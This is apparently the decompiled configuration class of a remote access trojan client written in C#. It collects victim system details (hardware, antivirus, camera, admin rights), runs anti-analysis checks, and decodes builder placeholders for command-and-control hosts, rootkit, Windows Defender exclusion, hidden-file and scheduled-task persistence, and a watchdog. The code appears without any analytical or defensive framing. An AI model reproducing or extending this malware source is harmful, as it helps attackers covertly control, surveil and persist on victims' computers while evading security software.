using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using Client.Helper;

namespace Client
{
	// Token: 0x02000002 RID: 2
	internal class Config
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		public static void Init()
		{
			Config.Antivirtual = EncryptString.Decode(Config.Antivirtual);
			if (Config.Antivirtual != EncryptString.Decode("false"))
			{
				AntiVirtual.RunAntiAnalysis();
			}
			Config.RegKey = EncryptString.Decode("Software\\gogoduck");
			Config.WindowsVersion = Methods.GetWindowsVersion();
			Config.Gpu = string.Join(EncryptString.Decode(","), Methods.GetHardwareInfo(EncryptString.Decode("Win32_VideoController"), EncryptString.Decode("Name")));
			Config.DataInstall = File.GetCreationTime(Process.GetCurrentProcess().MainModule.FileName).ToString(EncryptString.Decode("dd.MM.yyyy"));
			Config.Hwid = HwidGenerator.hwid();
			Config.Cpu = string.Join(EncryptString.Decode(","), Methods.GetHardwareInfo(EncryptString.Decode("Win32_Processor"), EncryptString.Decode("Name")));
			Config.AntiVirus = Methods.Antivirus();
			Config.Camera = Methods.Camera();
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Config.Privilege = EncryptString.Decode("Admin");
			}
			else
			{
				Config.Privilege = EncryptString.Decode("User");
			}
			Config.Hosts = EncryptString.Decode(Config.Hosts);
			Config.Group = EncryptString.Decode(Config.Group);
			Config.Version = EncryptString.Decode(Config.Version);
			Config.Mutex = EncryptString.Decode(Config.Mutex);
			Config.Install = EncryptString.Decode(Config.Install);
			Config.RootKit = EncryptString.Decode(Config.RootKit);
			Config.Key = EncryptString.Decode(Config.Key);
			Config.Certificate = EncryptString.Decode(Config.Certificate);
			if (Config.Install == EncryptString.Decode("true"))
			{
				Config.PathClient = Methods.GetPath(EncryptString.Decode(Config.PathClient));
				Config.UseInstallAdmin = EncryptString.Decode(Config.UseInstallAdmin);
				Config.ExclusionWD = EncryptString.Decode(Config.ExclusionWD);
				Config.HiddenFile = EncryptString.Decode(Config.HiddenFile);
				Config.Pump = EncryptString.Decode(Config.Pump);
				Config.UserInit = EncryptString.Decode(Config.UserInit);
				Config.TaskClient = EncryptString.Decode(Config.TaskClient);
				Config.InstallWatchDog = EncryptString.Decode(Config.InstallWatchDog);
				if (Config.InstallWatchDog == EncryptString.Decode("true"))
				{
					Config.PathWatchDog = Methods.GetPath(EncryptString.Decode(Config.PathWatchDog));
					Config.TaskWatchDog = EncryptString.Decode(Config.TaskWatchDog);
				}
			}
			Config.ServerCertificate = new X509Certificate2(Xor.DecodEncod(Methods.GetResourceFile(Config.Certificate), Encoding.ASCII.GetBytes(Config.Key)));
		}

		// Token: 0x04000001 RID: 1
		public static string Hosts = "%Hosts%";

		// Token: 0x04000002 RID: 2
		public static string Group = "%Group%";

		// Token: 0x04000003 RID: 3
		public static string Version = "%Version%";

		// Token: 0x04000004 RID: 4
		public static string Mutex = "%Mutex%";

		// Token: 0x04000005 RID: 5
		public static string Install = "%Install%";

		// Token: 0x04000006 RID: 6
		public static string InstallWatchDog = "%InstallWatchDog%";

		// Token: 0x04000007 RID: 7
		public static string UseInstallAdmin = "%UseInstallAdmin%";

		// Token: 0x04000008 RID: 8
		public static string ExclusionWD = "%ExclusionWD%";

		// Token: 0x04000009 RID: 9
		public static string HiddenFile = "%HiddenFile%";

		// Token: 0x0400000A RID: 10
		public static string RootKit = "%RootKit%";

		// Token: 0x0400000B RID: 11
		public static string Pump = "%Pump%";

		// Token: 0x0400000C RID: 12
		public static string TaskClient = "%TaskClient%";

		// Token: 0x0400000D RID: 13
		public static string TaskWatchDog = "%TaskWatchDog%";

		// Token: 0x0400000E RID: 14
		public static string PathClient = "%PathClient%";

		// Token: 0x0400000F RID: 15
		public static string PathWatchDog = "%PathWatchDog%";

		// Token: 0x04000010 RID: 16
		public static string Certificate = "%Cerificate%";

		// Token: 0x04000011 RID: 17
		public static string Antivirtual = "%AntiVirtual%";

		// Token: 0x04000012 RID: 18
		public static string UserInit = "%UserInit%";

		// Token: 0x04000013 RID: 19
		public static string Key = "%Key%";

		// Token: 0x04000014 RID: 20
		public static string Camera;

		// Token: 0x04000015 RID: 21
		public static string Cpu;

		// Token: 0x04000016 RID: 22
		public static string Gpu;

		// Token: 0x04000017 RID: 23
		public static string AntiVirus;

		// Token: 0x04000018 RID: 24
		public static string RegKey;

		// Token: 0x04000019 RID: 25
		public static string WindowsVersion;

		// Token: 0x0400001A RID: 26
		public static string Hwid;

		// Token: 0x0400001B RID: 27
		public static string DataInstall;

		// Token: 0x0400001C RID: 28
		public static string Privilege;

		// Token: 0x0400001D RID: 29
		public static X509Certificate2 ServerCertificate;
	}
}
